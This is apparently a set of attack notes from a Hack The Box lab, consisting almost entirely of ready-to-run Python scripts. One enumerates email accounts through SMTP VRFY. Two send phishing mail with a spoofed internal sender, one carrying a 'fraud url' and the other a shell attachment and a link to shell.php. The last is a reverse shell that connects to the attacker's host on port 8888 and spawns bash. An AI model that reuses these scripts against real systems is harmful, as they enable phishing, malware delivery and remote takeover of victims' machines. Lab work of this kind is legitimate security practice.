Python - SMTP

**Create an smtp scanner to check for valid email addresses**
**
**
import smtplib

print("Welcome, welcome")

connex = smtplib.SMTP("10.10.10.197")
print("Connection established")

with open("emails.lst", "r") as raw_emails:

    emails = [ line.strip() for line in raw_emails.read().split("\n") if line ]

for email in emails:
    print(connex.verify(email))

connex.quit()
print("exit")

* * *

**Send an email to all the users in a list with a fraud url in it**
**
**
import smtplib
from email.mime.text import MIMEText

print("Welcome, welcome")

connex = smtplib.SMTP("10.10.10.197")
print("Connection established")

message = MIMEText(u"http://10.10.14.29/test.txt")

#connex.set_debuglevel(1)
with open("emails.lst", "r") as raw_emails:
    emails = [ line.strip() for line in raw_emails.read().split("\n") if line ]

emails = ["paulbyrd@sneakymailer.htb"]

for email in emails:

    connex.sendmail("zoritaserrano@sneakymailer.htb", email, message.as_string())

    print(f"Email sent to {email}")

connex.quit()
print("exit")

* * *

**Send an email to a list, with an attachment**

import smtplib
from email.mime.text import MIMEText
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate

print("Welcome, welcome")

connex = smtplib.SMTP("10.10.10.197")
print("Connection established")

message = MIMEMultipart()
message.attach(MIMEText(u"http://10.10.14.29/shell.php"))

files = ["shell.py"]

for f in files or []:
    with open(f, "rb") as fil:
        part = MIMEApplication(
            fil.read(),
            Name=basename(f)
        )
    # After the file is closed
    part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
    message.attach(part)

print("Files parsed")

emails = ["paulbyrd@sneakymailer.htb"]

for email in emails:

    connex.sendmail("zoritaserrano@sneakymailer.htb", email, message.as_string())

    print(f"Email sent to {email}")

connex.quit()
print("exit")

* * *

**Reverse shell**

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.29",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")

* * *